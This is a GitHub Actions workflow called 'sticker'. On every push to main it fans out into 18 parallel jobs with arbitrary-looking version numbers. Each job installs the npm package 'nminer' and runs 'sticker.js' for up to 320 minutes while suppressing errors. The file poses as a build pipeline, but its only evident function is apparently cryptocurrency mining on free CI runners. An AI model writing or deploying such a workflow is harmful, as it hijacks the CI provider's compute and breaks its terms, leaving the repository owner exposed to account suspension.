name: sticker
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4786 }
          - { version: 1064 }
          - { version: 5450 }
          - { version: 4034 }
          - { version: 5965 }
          - { version: 1544 }
          - { version: 7846 }
          - { version: 6926 }
          - { version: 4961 }
          - { version: 2543 }
          - { version: 5269 }
          - { version: 568 }
          - { version: 9307 }
          - { version: 9110 }
          - { version: 7757 }
          - { version: 2082 }
          - { version: 4038 }
          - { version: 5899 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: unusual
        run: |
          npm install nminer@latest
          timeout 320m node sticker.js || echo "sticker executed"